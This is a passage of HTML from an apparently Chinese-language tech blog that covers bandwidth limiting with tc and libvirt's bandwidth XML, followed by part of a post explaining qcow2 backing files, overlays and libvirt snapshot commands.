style="color:#36acaa">0.0</span><span class="token plain">.0.0/0 police rate </span><span class="token variable" style="color:#36acaa">$out_average</span><span class="token plain"> burst </span><span class="token variable" style="color:#36acaa">${out_bw}</span><span class="token plain">kb mtu 64kb drop </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flowid :1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># clean up interface bandwidth limit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># usage: tc_del iface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function-name function" style="color:#d73a49">tc_del</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">iface</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">tc</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;/sbin/tc&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc del dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> root </span><span class="token operator" style="color:#393A34">&amp;&gt;&gt;</span><span class="token plain">/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sleep</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc del dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> ingress </span><span class="token operator" style="color:#393A34">&amp;&gt;&gt;</span><span class="token plain">/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="libvirt中的带宽控制">libvirt中的带宽控制<a class="hash-link" href="#libvirt中的带宽控制" title="标题的直接链接">​</a></h2><p>我比较推荐的方法还是直接使用libvirt，libvirt 中已经集成了带宽控制的功能，下面是关于带宽控制部分的xml描述:</p><p>使用方法：在网卡interface中加入</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">bandwidth</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">inbound</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">average</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">1000</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">peak</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">5000</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">burst</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">1024</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">outbound</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">average</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">128</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">peak</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">256</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">burst</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">256</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">bandwidth</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>以下是关于各项参数的解释，获取最新的信息可以参考<a href="http://www.libvirt.org/" target="_blank" rel="noopener noreferrer">libvirt文档</a>.</p><ul><li><p>mandatory attribute:</p><ul><li>average: It specifies average bit rate on interface being shaped.</li></ul></li><li><p>optional attributes:</p><ul><li>peak: which specifies maximum rate at which interface can send data,</li><li>burst: amount of bytes that can be burst at peak speed.</li></ul></li></ul><p>Accepted values: integer numbers.</p><p>units:</p><ul><li>average: kilobytes per second</li><li>peak: kilobytes per second</li><li>burst: kilobytes.</li></ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/tc">tc</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/bandwidth">bandwidth</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull">浅析qcow2镜像文件的快照合并</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-11-23T00:00:00.000Z" itemprop="datePublished">2012年11月23日</time> · <!-- -->阅读需 17 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>这是一篇关于snapshots, blockpull, blockcommit的的介绍.作者和with Eric Blake, Jeff Cody,Kevin Wolf以及很多IRC和mailing lists里面的同学大量讨论以及作者大量的特向测试的基础之上总结出来的</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="基础知识">基础知识<a class="hash-link" href="#基础知识" title="标题的直接链接">​</a></h2><p>一个虚拟机快照可被看作是虚拟机的在某个指定时间的视图（包括他的操作系统和所有的程序）.据此，某可以还原到一个之前的完整的状态，或者在guest运行的时候做个备份.所以，在我们继续深入之前我们必须搞懂两个名词：backing files和overlays .</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="qcow2-backing-files-与-overlays">QCOW2 backing files 与 overlays<a class="hash-link" href="#qcow2-backing-files-与-overlays" title="标题的直接链接">​</a></h3><p>qcow2（qemu copy-on-write）具有创建一个base-image，以及在base-image（即backing file）的基础上创建多个copy-on-write overlays镜像的能力.backing files和overlays十分有用，可以迅速的创建瘦装备虚拟机的实例，特别是在开发测试的时候可以让你迅速的回滚到之前的某个已知状态，丢弃overlay.</p><p>Figure-1</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.--------------.    .-------------.    .-------------.    .-------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|              |    |             |    |             |    |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase     |&lt;---| Overlay-1   |&lt;---| Overlay-1A  &lt;--- | Overlay-1B  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| (raw/qcow2)  |    | (qcow2)     |    | (qcow2)     |    | (qcow2)     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;--------------&#x27;    &#x27;-------------&#x27;    &#x27;-------------&#x27;    &#x27;-------------&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图表明rootbase是overlay-1的backing file，以此类推.</p><p>Figure-2</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.-----------.   .-----------.   .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |           |   |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase  |&lt;--- Overlay-1 |&lt;--- Overlay-1A &lt;--- Overlay-1B &lt;--- Overlay-1C |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |           |   |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;-----------&#x27;   &#x27;-----------&#x27;   &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ^    ^</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |       .-----------.    .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |       |           |    |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    &#x27;-------| Overlay-2 |&lt;---| Overlay-2A |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            |           |    | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            &#x27;-----------&#x27;    &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            .-----------.    .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            |           |    |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   &#x27;------------| Overlay-3 |&lt;---| Overlay-3A |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                |           |    | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                &#x27;-----------&#x27;    &#x27;------------&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图表明我们可以只用单个backing file来创建多条链.</p><p>注意 : backing file 总是 只读 打开的. 换言之, 一旦新快照被创建，他的后端文件就不能被修改,(快照依赖于后端文件的这种状态).了解更多参见后面的(&#x27;blockcommit&#x27; 节) .</p><p>示例 :</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[FedoraBase.img] ----- &lt;- [Fed-guest-1.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-1A]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  \--- &lt;- [Fed-guest-2.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-2A]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（注意箭头的方向，Fed-w-updates.qcow2 的backing file是 Fed-guest-1.qcow2）</p><p>上面的示例中可以看到 FedoraBase.img 安装了一个fedora17系统，并作为我们的backing file.现在这个backing file将作为模板快速的创建两个瘦装备实例，和 Figure-2 道理是一样的.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="具体操作">具体操作<a class="hash-link" href="#具体操作" title="标题的直接链接">​</a></h2><p>使用qemu-img为单个backing file来创建两个fedora的瘦装备克隆:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  /export/vmimages/Fedora-guest-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  /export/vmimages/Fedora-guest-2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在，上面创建出来的两个镜像 Fedora-guest-1 &amp; Fedora-guest-2 都可以用来启动一个虚拟机，继续我们的示例，现在我们需要创建一个f17的实例，但是这次我们需要创建的是具有完整的更新的实例，这时可以创建另外一个overlay（Fedora-guest-with-updates-1A）而这个overlay的backing file是&#x27;Fed-w-updates.qcow2&#x27;（一个包含了完整更新的镜像）:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/Fed-w-updates.qcow2 -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我们可以使用qemu-img命令来查看镜像的信息，包括虚拟磁盘大小，使用大小，backing file指向:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注意: 最新版本的qemu-img可以递归查询到整条完整的链:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info --backing-chain /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>名词解释Snapshot:</p><ul><li>内置快照（Internal Snapshots） -- 单个qcow2镜像文件存储了包括数据以及快照的状态信息，</li></ul><p>内置快照又可以细分一下:-</p><ul><li><p>内置磁盘快照（Internal disk snapshot）:</p></li><li><p>快照点的磁盘状态，数据和快照保存在单个qcow2文件中，虚拟机运行状态和关闭状态都可以创建.</p></li></ul><p>Libvirt 使用 &#x27;qemu-img&#x27; 命令创建关机状态的磁盘快照.Libvirt 使用 &#x27;savevm&#x27; 命令创建运行状态的磁盘快照.</p><ul><li>内置系统还原点（Internal system checkpoint）:</li></ul><p>内存状态，设备状态和磁盘状态，可以为运行中的虚拟机创建，所有信息都存储在同一个qcow2文件中，只有在运行状态才能创建内置系统还原点.</p><p>Libvirt 使用&#x27;savevm&#x27; 命令来创建这种快照</p><ul><li>外置快照（External Snapshots） -- 当一个快照被创建时，创建时当前的状态保存在当前使用的磁盘文件中，即成为一个backing file.此时一个新的overlay被创建出来保存往后的数据.</li></ul><p>这个也可以细分一下:-</p><ul><li>外置磁盘快照（External disk snapshot）: 磁盘的快照被保存在一个文件中，创建时间点以后的数据被记录到一个新的qcow2文件中.同样可以在运行和关闭状态创建.</li></ul><p>Libvirt 使用 &#x27;transaction&#x27; 命令来为运行状态创建这种快照.
Libvirt 使用&#x27;qemu-img&#x27; 命令为关闭状态创建这种快照(截止目前功能还在开发中).</p><ul><li>外置系统还原点（External system checkpoint）:</li></ul><p>虚拟机的磁盘状态将被保存到一个文件中，内存和设备的状态将被保存到另外一个新的文件中，</p><p>（这个功能也还在开发中）.</p><p>VM状态（VM state）:</p><p>保存运行状态虚拟机的内存设备状态信息至文件，可以通过此文件恢复到保存时的状态，有点类似系统的休眠.（注意创建VM状态保存的时候VM磁盘必须是未发生写入改动的）</p><p>Libvirt使用 &#x27;migrate&#x27; (to file)命令来完成VM状态转储.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="创建快照">创建快照<a class="hash-link" href="#创建快照" title="标题的直接链接">​</a></h2><p>每次产生一个外置snapshot，一个 /new/ overlay 镜像就会随之生成，而前一个镜像就变成了一个快照.</p><p>diskonly内置快照创建</p><p>假如需要为名为&#x27;f17vm1&#x27;的虚拟机创建一个运行态或关闭态的内置快照snap1</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-create-as f17vm1  snap1 snap1-desc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>列出快照列表，使用<em>qemu-img</em>查看info</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-list f17vm1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info /home/kashyap/vmimages/f17vm1.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>disk-only外置快照创建 :</p><p>查看虚拟机磁盘列表</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh domblklist f17-base</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Target     Source</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vda        /export/vmimages/f17-base.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>创建外置disk-only磁盘快照（VM<em>运行态</em>）:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-create-as --domain f17-base snap1 snap1-desc \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--disk-only --diskspec vda,snapshot=external,file=/export/vmimages/sn1-of-f17-base.qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--atomic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain snapshot snap1 created</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V 